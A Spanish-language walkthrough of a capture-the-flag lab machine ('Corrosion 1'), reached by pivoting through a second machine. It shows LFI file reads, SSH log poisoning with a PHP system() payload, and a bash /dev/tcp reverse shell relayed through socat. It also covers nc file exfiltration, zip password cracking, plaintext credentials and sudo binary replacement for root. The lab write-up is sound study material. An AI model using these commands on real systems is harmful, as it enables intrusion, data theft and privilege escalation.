En el navegador mediante FoxyProxy e indicandole que su proxy es su tunel de chisel podremos llegar al puerto 80 que vemos es un apache. 

Pasaremos a enumerar con gobuster mediane el proxy en proxychain en nuestra maquina

```


gobuster dir -u http://10.10.0.129 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,xml,zip -t 20 --proxy socks5://127.0.0.1:1080 

index.html           (Status: 200) [Size: 10918]
/tasks                (Status: 301) [Size: 310] [--> http://10.10.0.129/tasks/]
/blog-post            (Status: 301) [Size: 314] [--> http://10.10.0.129/blog-post/]
/server-status        (Status: 403) [Size: 276]
Progress: 1323342 / 1323342 (100.00%)

Encontrmos mas nuevas rutas a las cuales hacer un reconocimiento 

$ gobuster dir -u http://10.10.0.129/blog-post/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,xml,zip -t 20 --proxy socks5://127.0.0.1:1080

index.html           (Status: 200) [Size: 190]
/archives             (Status: 301) [Size: 323] [--> http://10.10.0.129/blog-post/archives/]
/uploads              (Status: 301) [Size: 322] [--> http://10.10.0.129/blog-post/uploads/]

Encontramos en la ruta  http://10.10.0.129/blog-post/archives/ un archivo randylogs.php 
que al ejecutarlo no nos devuelve nada. La logica indica que estos archivos pueden conener parametros que nos permitan ejecutar un local file inclusion, asi que haremoas fuzzin para ver si encontramos este parametro.

Lo haremos con gobuster

 gobuster fuzz -u "http://10.10.0.129/blog-post/archives/randylogs.php?FUZZ=/etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy socks5://127.0.0.1:1080 | grep -v "Length=0" 

Aqui encontramos que al .php acepta el parametro file y permite leer ficheros en el sistema en este caso /etc/passwd
```


Con burbsuite tambien podemos hacerlo en este caso seria necesario pasar pos 2 proxys el  1ro el de Burbsuite y luego decirle a burpsuite que coja por la conexion socks5 que establecimos en chisel Explicacion en el enlace https://youtu.be/Mc4FuBRyybc?t=5701

Importante ver el video en caso de dudas 

Filtraremos los resutados para detectar usuarios que tenga acceso a una bash

```
─$ proxychains curl "http://10.10.0.129/blog-post/archives/randylogs.php?file=/etc/passwd" 2>/dev/null | grep "sh"
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/sh
randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin


Rutas interesante 
Nos da la ip del equipo
/proc/net/fib_trie  

Nos da informacion de los procesos y tareas que estan corriendo en la maquina
/proc/sched_debug

Nos da los puertos estan abiertos internamente en la maquina, los puerto estan en exadecimal asi que hay de decodificarlos 
/proc/net/tcp
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.0.129:80  ...  OK
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   
   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 27134 1 0000000000000000 100 0 0 10 0                     
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 31931 1 0000000000000000 100 0 0 10 0                     
   2: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 39429 1 0000000000000000 100 0 0 10 0  
   
   Estos serian los puertos
   0035, 0016, 0277
   
   Los decodificamos con python ejecutamos python y ponemo 0xhexadecimal
$ python3                                                                                  
Python 3.13.7 (main, Aug 20 2025, 22:17:40) [GCC 14.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x0035
53
>>> 0x0016
22
>>> 0x0277
631
>>> 
    
```

Probaremos si tenemos acceso a los logs y si podemos manipularlos , pues al poder manipular estos podremos inyectar y ejecutar codigo malicioso en la maquina objetivo 
Logs importantes los de ssh [/var/log/auth.log] y los logs de apache [/var/log/apache2/acces.log] que tienen el parametro user-agent que son una puerta de entrada al sistema.

```
curl "http://10.10.0.129/blog-post/archives/randylogs.php?file=/var/log/apache.log/apache2/acces.log"


proxychains curl "http://10.10.0.129/blog-post/archives/randylogs.php?file=/var/log/auth.log"

En los log de ssh tenemos lectura y podemos insertar logs en este mediante 
intentos de acceso ssh
 
proxychains ssh adrianTest@10.10.0.129  

Nos intentamos loguear con cualquier pasas y revisamos nuevamente el log y vemos que tenmos en este  adrianTest

```

Ahora procedemos a insertar un codigo malicioso en el usuario de la coneccion ssh

```
proxychains ssh "<?php system(\$_GET['cmd']); ?>"@10.10.0.129 
```

Esto nos fue inutil porque la version de ssh en la maquina es moderna y evita el uso de caracteres extranos por lo cual nos creamos un script de python para intentar hacer el envenenamiento de logs a la maquin objetivo mediante la coneccion de chisel
[[Python Log Poisoning| Script Python]]

Una ves envenenado el log podemo mediante  peticiones ejecutar codigo dentro de la maquina e intentar establecer una coneccion con nuestra maquina atacante,  pero aqui tenemos un problema dado el escenario pues esta maquina no tiene coneccion directa con nusetra maquina atacante sino mediante la  maquina Corrosion 2 que estamos utilizando de pivot. Para lograr esta coneccion en la direccion contraria necesitaremos socat.  [[Socat]]

Por lo tanto nos descargamos socat y lo enviamos a la maquina intermedia para establecer un tunel hacia nuestra maquina atacante y desde la maquina objetivo Corrosion1 pasar por el navegador una reverse shell

En nuestra maquina atacante nos pondremos a la escucha por un puerto para obener la reverse shell podemos hacerlos utilizando cualuiera de los siguientes metodos
```
Con netcat
nc -lnvp 3333

Con pwncat
pwncat -l 3333

Con pwncat-cs Este nos da opciones de unumeracion desde su menu
pwncat-cs -lp 3333


```

En la maquina intermedia Corrosion2 ya comprometida subimos socat y abrimos un sock a la a nuestra maquina al puerto que esta a la escucha
```
./socat tcp-l:4646,fork,reuseaddr,crlf tcp:192.168.1.108:3333

Esto que hace pues pone a escuchar a la maquina en el puerto 4646 y renvia todo lo que recipe por este puerto al puerto 3333 de la maquina 192.168.1.108 que esta escuchando 
```

Finalmente desde el navegador pasaremos una reverse shell que utilizara el parametro comprometido en el log 

```
http://10.10.0.129/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.0.128%2F4646%200%3E%261%22

Tambien poemos con curl podemos hacer una peticion a esta direccion pasando por el proxychange que es el que perite llegar a la maquina destino

proxychains curl "http://10.10.0.129/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.0.128%2F4646%200%3E%261%27"

 
```

Asi obtenemos una una coneccion con la maquina nuestra atravez de ReverseShell mediante socat y utilizando una vulnerabilidad LFI y log poisoning 

Ya dentro de la maquina nos dedicamos a buscar informacion donde encontramos en la carpeta /var/backups un fichero user_backup.zip que nos lo enviaremos a nuestra maquina con nc de la siguiente manera

Siempre tener en cuenta que no tenemos una coneccion directa sino que es atravez de la coeccion socat en la maquina Corrosion2

```
En nuestra maquina atacante aprovecharemos esta coneccion socat y diremos con nc

nc -lnpv 3333 > user_backup.zip

Que estamos haciedo aqui pues todo lo que nc reciba por este puerto lo copiara como user_backup.zip

En la maquina objetivo en este caso Corrosion1 

nc 10.10.0.128 4646 < user_backup.zip

Aqui le decimos a nc que coja el archivo  user_backup.zip y envialo al puerto 4646 de la maquina intermedia 10.10.0.128 que es la que tiene coneccion con nuestra maquina atacante
```

Intentamos ver que tiene el archivo 
```
$ unzip -l user_backup.zip 
Archive:  user_backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     2590  2021-07-30 08:20   id_rsa
      563  2021-07-30 08:20   id_rsa.pub
       23  2021-07-30 08:21   my_password.txt
      148  2021-07-30 08:11   easysysinfo.c
---------                     -------
     3324                     4 files


Lo intentamos descomprimir 
unzip user_backup.zip -d user_backup 
Archive:  user_backup.zip
[user_backup.zip] id_rsa password:


```

Vemos que tiene password asi que le hacemos Fuerza bruta con la herramienta fcrackzip o john the ripper Ejemplos   [[fcrackzip]]     [[John The riper]]

```
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt user_backup.zip

Nos encuentra el password                  

PASSWORD FOUND!!!!: pw == !randybaby

```

Descomprimimos el zip con esta contrasenna y encontramos un archivo my_password.txt con la pass del usuario randy

```
randy    randylovesgoldfish1998
```

Ahora nos conectamos por ssh a esta maquina Corrosion1 con la pass encontrada randylovesgoldfish1998
```
proxychains ssh randy@10.10.0.129
```
 
 Aqui comenzaremos el proceso de escalada  

```
randy@corrosion:~$ sudo -l
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /home/randy/tools/easysysinfo

Encontramos que el usuario randy puede ejecutar como administrados /home/randy/tools/easysysinfo este archivo
que esta en user_backup y podemos ver lo que hace 

El archivo easysysinfo es propiedad de root y solo podemos leerlo

randy@corrosion:~$ ls -l /home/randy/tools/easysysinfo
-rwsr-xr-x 1 root root 16192 Jul 30  2021 /home/randy/tools/easysysinfo
randy@corrosion:~$

Pero la carpeta tools tiene otros permisos por lo que si nos permitiria sobreescribir el archivo eliminarlo y crearlo 

randy@corrosion:~$ ls -ld /home/randy/tools
drwxrwxr-x 2 randy randy 4096 Jul 30  2021 /home/randy/tools


```

Pues nos creamos un archivo payload.c para compilarlo y que nos proporcione una bach con privilegios sudo 
[[Compilacion de scrips en C| Ejemplo de codigo en c que otorga una bash]]

Poniendo en el fichero payload.c el ejemplo de codigo anterior lo compilamos y le ponemos el mismo nombre del fichero que se le permite ejecutar como root

```
gcc payload.c -o easysysinfo

randy@corrosion:~/tools$ ls -la
total 32
drwxrwxr-x  2 randy randy  4096 Oct 25 12:28 .
drwxr-x--- 17 randy randy  4096 Jul 30  2021 ..
-rwxrwxr-x  1 randy randy 16192 Oct 25 12:28 easysysinfo
-rwxr-xr-x  1 root  root    318 Jul 29  2021 easysysinfo.py
-rw-rw-r--  1 randy randy    81 Oct 25 12:27 payload.c

Solo queda ejecutarlo

sudo -u root /home/randy/tools/easysysinfo

sudo ./easysysinfo

sudo -u root ./easysysinfo
```